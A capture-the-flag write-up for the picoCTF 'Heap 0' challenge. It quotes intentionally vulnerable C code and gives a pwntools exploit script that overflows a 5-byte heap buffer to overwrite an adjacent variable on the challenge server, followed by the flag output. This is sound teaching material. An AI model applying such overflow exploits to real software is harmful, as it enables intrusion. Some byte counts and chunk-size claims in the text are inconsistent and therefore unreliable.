# HEAP 0

***

## Writeup: Heap 0 - PicoCTF

### Challenge Overview

* **Name:** Heap 0
* **Authors:** Abrxs, pr1or1tyQ
* **Category:** Binary Exploitation
* **Points:** (Assuming 100-200, intro heap challenge)
* **Server:** `nc tethys.picoctf.net 51595`
* **Files:** `heap0.c` (source), `heap0` (binary)
* **Description:** "Are overflows just a stack concern?"
* **Hint:** "What part of the heap do you have control over and how far is it from the safe\_var?"

This PicoCTF challenge introduces heap exploitation with a remote instance. Our task: overwrite `safe_var` to print the flag from `flag.txt`.

***

### Initial Analysis

#### Binary Protections

(Assumed from source and typical PicoCTF setup):

* **Arch:** amd64-64-little
* **RELRO:** Likely Partial RELRO
* **Stack:** No canary (heap-focused)
* **NX:** Enabled
* **PIE:** Likely disabled
* **Stripped:** Likely not stripped

#### Source Code

```c
#define INPUT_DATA_SIZE 5
#define SAFE_VAR_SIZE 5

char *safe_var;
char *input_data;

void check_win() {
    if (strcmp(safe_var, "bico") != 0) {
        printf("\nYOU WIN\n");
        char buf[64];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, 64, fd);
        printf("%s\n", buf);
        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
    }
}

void init() {
    input_data = malloc(INPUT_DATA_SIZE);
    strncpy(input_data, "pico", INPUT_DATA_SIZE);
    safe_var = malloc(SAFE_VAR_SIZE);
    strncpy(safe_var, "bico", SAFE_VAR_SIZE);
}

void write_buffer() {
    printf("Data for buffer: ");
    scanf("%s", input_data);
}
```

* **Setup:**
  * `input_data`: 5-byte heap buffer (`"pico"`).
  * `safe_var`: 5-byte heap buffer (`"bico"`).
* **Vuln:** `scanf("%s", input_data)`—unbounded input into a 5-byte buffer.
* **Win:** `safe_var != "bico"` prints the flag.

#### Vulnerability

* **Heap Overflow:** `scanf` lets us write beyond `input_data`’s 5 bytes.
* **Heap Layout:** Sequential `malloc`s place `safe_var` after `input_data`.
* **Goal:** Overflow into `safe_var` to change it.

***

### Exploitation Plan

#### Step 1: Heap Layout

Remote heap output:

```
[*]   0x5a00704b22b0  ->   pico
[*]   0x5a00704b22d0  ->   bico
```

* **Distance:** `0x22d0 - 0x22b0 = 0x20` (32 bytes).
* **Chunk Size:** `malloc(5)` rounds to 16 bytes (8-byte metadata + 8 bytes data).
* **Layout:**
  * `0x22b0`: `input_data` data.
  * `0x22c0`: `safe_var` metadata.
  * `0x22d0`: `safe_var` data.

#### Step 2: Payload

* **Reach `safe_var`:** 32 bytes from `input_data` to `safe_var`’s data.
* **Payload:** 32 bytes padding + `"pwn3d"` (38 bytes total).

#### Step 3: Exploit

* Write the payload and trigger the win check.

***

### Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

# Connect
p = remote('tethys.picoctf.net', 51595)
p.recvuntil(b'Enter your choice: ')

# Write to buffer
p.sendline(b'2')
p.recvuntil(b'Data for buffer: ')
payload = b'A' * 32 + b'pwn3d'  # 38 bytes
p.sendline(payload)
log.info(f'Sent payload: {payload}')

# Check win
p.sendlineafter(b'Enter your choice: ', b'4')
p.interactive()
```

#### How It Works

1. **Connects:** Links to the remote server.
2. **Payload:**
   * `A*32`: Fills `input_data` and padding to reach `safe_var`.
   * `pwn3d`: Overwrites `safe_var`.
3. **Wins:** Option 4 checks `safe_var != "bico"`, prints the flag.

***

### Execution

From your run:

```
$ python exp.py
[+] Opening connection to tethys.picoctf.net:51595: Done
[*] Sent payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApwn3d'
[*] Switching to interactive mode
YOU WIN
picoCTF{my_first_heap_overflow_c3935a08}
[*] Got EOF while reading in interactive
```

* **Payload:** `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApwn3d`.
* **Result:** `safe_var` changed, flag retrieved!

***

### Challenges Faced

1. **Offset Misstep:** Initial 19-byte payload (`A*5 + B*11 + pwn3d`) was too short—heap dump revealed 32 bytes needed.
2. **Heap Guesswork:** No local binary, so we tuned padding with remote feedback.
3. **Precision:** Had to hit `safe_var`’s data exactly at `0x22d0`.

***

### Conclusion

"Heap 0" was a fantastic intro to heap overflows. The unbounded `scanf` let us smash past `input_data`’s 5 bytes, overwriting `safe_var` 32 bytes away. With a precise payload and a little heap sleuthing, we turned "secure" into "pwned" and grabbed the flag. Stack overflows? Heap says hold my buffer!

**Flag:** `picoCTF{my_first_heap_overflow_c3935a08}`

Happy hacking!

***
